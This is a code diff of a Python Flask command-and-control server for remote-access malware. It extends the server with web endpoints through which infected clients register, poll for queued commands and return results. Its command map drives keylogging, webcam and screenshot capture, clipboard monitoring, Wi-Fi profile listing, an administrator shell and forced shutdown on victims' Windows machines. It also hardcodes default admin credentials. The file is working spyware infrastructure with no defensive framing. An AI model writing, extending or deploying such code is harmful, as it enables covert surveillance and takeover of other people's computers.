@@ -3,6 +3,7 @@ import json
 import threading
 import os
 import time
+import uuid
 from flask import Flask, request, render_template, redirect, url_for, session, flash
 from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
 from werkzeug.security import generate_password_hash, check_password_hash
@@ -12,15 +13,19 @@ import re
 
 # Server configuration
 SERVER_IP = '0.0.0.0'  # Listen on all interfaces
-SERVER_PORT = 5000     # TCP port for client connections
-WEB_PORT = int(os.environ.get('PORT', 8080))  # Port for Flask web interface (Render compatible)
+WEB_PORT = int(os.environ.get('PORT', 8080))  # Port for Flask web interface (Railway compatible)
+SERVER_PORT = 5000     # TCP port for client connections (only works locally)
+RAILWAY_MODE = os.environ.get('RAILWAY_ENVIRONMENT') is not None  # Detect Railway deployment
 SECRET_KEY = os.environ.get('SECRET_KEY', 'pablosboson_secret_key_2024')  # Use environment variable for production
 
 # Global variables
 connected_clients = {}  # Dictionary to store client_id: socket pairs
+web_clients = {}  # Dictionary to store web-based clients
 clients_lock = threading.Lock()  # Lock for thread-safe client management
 command_queue = Queue()  # Queue for pending commands
 response_queue = Queue()  # Queue for client responses
+web_command_queue = {}  # Dictionary to store commands for web clients
+web_results = {}  # Dictionary to store results from web clients
 
 # User credentials - in a real app, this would be in a database
 # Default credentials: admin / pablosboson2024
@@ -280,24 +285,45 @@ def index():
 def get_clients():
     """Return list of connected clients with basic info"""
     with clients_lock:
-        clients = [
+        # TCP clients
+        tcp_clients = [
             {
                 'id': client_id,
                 'hostname': connected_clients[client_id]['system_info']['basic']['hostname'],
-                'ip': connected_clients[client_id]['system_info']['network']['ip_address']
+                'ip': connected_clients[client_id]['system_info']['network']['ip_address'],
+                'type': 'TCP'
             }
             for client_id in connected_clients
         ]
-    return {'clients': clients}
+        
+        # Web clients
+        web_clients_list = [
+            {
+                'id': client_id,
+                'hostname': web_clients[client_id]['system_info']['basic']['hostname'],
+                'ip': 'Web Client',
+                'type': 'Web',
+                'last_seen': web_clients[client_id]['last_seen']
+            }
+            for client_id in web_clients
+        ]
+        
+        all_clients = tcp_clients + web_clients_list
+    return {'clients': all_clients}
 
 @app.route('/client_info/<client_id>')
 @login_required
 def get_client_info(client_id):
     """Return detailed system info for a specific client"""
     with clients_lock:
+        # Check TCP clients first
         if client_id in connected_clients:
             return {'system_info': connected_clients[client_id]['system_info']}
-        return {'error': 'Client not found'}, 404
+        # Check web clients
+        elif client_id in web_clients:
+            return {'system_info': web_clients[client_id]['system_info']}
+        else:
+            return {'error': 'Client not found'}, 404
 
 @app.route('/command', methods=['POST'])
 @login_required
@@ -313,25 +339,26 @@ def send_command():
         return {'status': 'error', 'message': 'Invalid command'}, 400
 
     with clients_lock:
+        # Check if it's a TCP client
         if client_id in connected_clients:
             try:
-                # Map quick commands to specific actions
+                # Handle TCP client (existing code)
                 command_map = {
-                    'shutdown': 'shutdown /s /t 0',  # Immediate shutdown (Windows)
+                    'shutdown': 'shutdown /s /t 0',
                     'keylog_start': {'type': 'keylog_start', 'data': ''},
                     'keylog_stop': {'type': 'keylog_stop', 'data': ''},
                     'open_cmd': 'cmd.exe',
                     'open_cmd_admin': 'runas /user:Administrator cmd.exe',
                     'open_calculator': 'calc.exe',
                     'open_notepad': 'notepad.exe',
-                    'get_owner': 'net user %USERNAME%',  # Get owner info (Windows)
-                    'tasklist': 'tasklist',  # List running processes (Windows)
-                    'get_wifi_passwords': 'netsh wlan show profiles',  # Get WiFi profiles
-                    'capture_webcam': {'type': 'capture_webcam', 'data': ''},  # Capture webcam image
-                    'capture_screenshot': {'type': 'capture_screenshot', 'data': ''},  # Capture screenshot
-                    'clipboard_start': {'type': 'clipboard_start', 'data': ''},  # Start clipboard monitoring
-                    'clipboard_stop': {'type': 'clipboard_stop', 'data': ''},  # Stop clipboard monitoring
-                    'clipboard_get': {'type': 'clipboard_get', 'data': ''}  # Get current clipboard content
+                    'get_owner': 'net user %USERNAME%',
+                    'tasklist': 'tasklist',
+                    'get_wifi_passwords': 'netsh wlan show profiles',
+                    'capture_webcam': {'type': 'capture_webcam', 'data': ''},
+                    'capture_screenshot': {'type': 'capture_screenshot', 'data': ''},
+                    'clipboard_start': {'type': 'clipboard_start', 'data': ''},
+                    'clipboard_stop': {'type': 'clipboard_stop', 'data': ''},
+                    'clipboard_get': {'type': 'clipboard_get', 'data': ''}
                 }
 
                 if command in command_map:
@@ -343,16 +370,38 @@ def send_command():
                     message = {'type': 'command', 'data': command}
 
                 try:
-                    # Ensure proper JSON encoding
                     json_data = json.dumps(message, ensure_ascii=True)
                     connected_clients[client_id]['socket'].sendall(json_data.encode('utf-8'))
-                    return {'status': 'success', 'message': 'Command sent'}
+                    return {'status': 'success', 'message': 'Command sent to TCP client'}
                 except Exception as e:
-                    print(f"Error sending command to {client_id}: {e}")
+                    print(f"Error sending command to TCP client {client_id}: {e}")
                     return {'status': 'error', 'message': f'Error sending command: {str(e)}'}, 500
             except Exception as e:
                 return {'status': 'error', 'message': str(e)}, 500
-        return {'status': 'error', 'message': 'Client not found'}, 404
+                
+        # Check if it's a web client
+        elif client_id in web_clients:
+            try:
+                # Add command to web client queue
+                command_id = str(uuid.uuid4())[:8]
+                command_data = {
+                    'command_id': command_id,
+                    'command': command,
+                    'timestamp': time.time()
+                }
+                
+                if client_id not in web_command_queue:
+                    web_command_queue[client_id] = []
+                web_command_queue[client_id].append(command_data)
+                
+                print(f"Queued command for web client {client_id}: {command}")
+                return {'status': 'success', 'message': 'Command queued for web client'}
+                
+            except Exception as e:
+                print(f"Error queuing command for web client {client_id}: {e}")
+                return {'status': 'error', 'message': f'Error queuing command: {str(e)}'}, 500
+        else:
+            return {'status': 'error', 'message': 'Client not found'}, 404
 
 @app.route('/responses')
 @login_required
@@ -361,20 +410,142 @@ def get_responses():
     responses = []
     while not response_queue.empty():
         responses.append(response_queue.get())
+    
+    # Also check web client results
+    web_responses = []
+    with clients_lock:
+        for client_id, results in list(web_results.items()):
+            for result in results:
+                web_responses.append((client_id, result['result'], result['command']))
+            web_results[client_id] = []  # Clear processed results
+    
+    responses.extend(web_responses)
     return {'responses': responses}
 
+# API endpoints for web-based clients
+@app.route('/api/register_client', methods=['POST'])
+def register_web_client():
+    """Register a web-based client"""
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        system_info = data.get('system_info')
+        
+        if not client_id:
+            return {'error': 'Missing client_id'}, 400
+            
+        with clients_lock:
+            web_clients[client_id] = {
+                'system_info': system_info,
+                'last_seen': time.time(),
+                'connection_type': 'web'
+            }
+            # Initialize command queue for this client
+            if client_id not in web_command_queue:
+                web_command_queue[client_id] = []
+            if client_id not in web_results:
+                web_results[client_id] = []
+                
+        print(f"Web client registered: {client_id}")
+        return {'status': 'registered', 'client_id': client_id}
+        
+    except Exception as e:
+        print(f"Error registering web client: {e}")
+        return {'error': str(e)}, 500
+
+@app.route('/api/get_commands/<client_id>', methods=['GET'])
+def get_commands_for_client(client_id):
+    """Get pending commands for a specific client"""
+    try:
+        with clients_lock:
+            if client_id not in web_clients:
+                return {'error': 'Client not found'}, 404
+                
+            # Update last seen
+            web_clients[client_id]['last_seen'] = time.time()
+            
+            # Get pending commands
+            commands = web_command_queue.get(client_id, [])
+            web_command_queue[client_id] = []  # Clear the queue
+            
+        return {'commands': commands}
+        
+    except Exception as e:
+        print(f"Error getting commands for {client_id}: {e}")
+        return {'error': str(e)}, 500
+
+@app.route('/api/command_result', methods=['POST'])
+def receive_command_result():
+    """Receive command result from web client"""
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        command = data.get('command')
+        result = data.get('result')
+        command_id = data.get('command_id')
+        
+        if not all([client_id, command, result]):
+            return {'error': 'Missing required fields'}, 400
+            
+        with clients_lock:
+            if client_id not in web_results:
+                web_results[client_id] = []
+            web_results[client_id].append({
+                'command': command,
+                'result': result,
+                'command_id': command_id,
+                'timestamp': time.time()
+            })
+            
+        print(f"Received result from {client_id} for command: {command}")
+        return {'status': 'received'}
+        
+    except Exception as e:
+        print(f"Error receiving command result: {e}")
+        return {'error': str(e)}, 500
+
+@app.route('/api/heartbeat', methods=['POST'])
+def web_client_heartbeat():
+    """Receive heartbeat from web client"""
+    try:
+        data = request.get_json()
+        client_id = data.get('client_id')
+        
+        if not client_id:
+            return {'error': 'Missing client_id'}, 400
+            
+        with clients_lock:
+            if client_id in web_clients:
+                web_clients[client_id]['last_seen'] = time.time()
+                return {'status': 'received'}
+            else:
+                return {'error': 'Client not registered'}, 404
+                
+    except Exception as e:
+        print(f"Error processing heartbeat: {e}")
+        return {'error': str(e)}, 500
+
 if __name__ == '__main__':
-    # Start TCP server in a separate thread
-    server_thread = threading.Thread(target=start_server, daemon=True)
-    server_thread.start()
+    # Start TCP server in a separate thread (only for local development)
+    if not RAILWAY_MODE:
+        server_thread = threading.Thread(target=start_server, daemon=True)
+        server_thread.start()
+        print(f"TCP server started on {SERVER_IP}:{SERVER_PORT}")
+    else:
+        print("Railway mode detected - TCP server disabled (web interface only)")
     
     # Print login information
     print("=" * 50)
     print("Server started successfully!")
-    print(f"Access the web interface at: http://localhost:{WEB_PORT}")
+    if RAILWAY_MODE:
+        print("Web interface will be available at your Railway URL")
+    else:
+        print(f"Access the web interface at: http://localhost:{WEB_PORT}")
     print("Login credentials:")
     print("  Username: admin")
     print("  Password: pablosboson2024")
+    if RAILWAY_MODE:
+        print("Note: Client connections disabled in Railway mode")
     print("=" * 50)
     
     # Start Flask web interface with SSL support
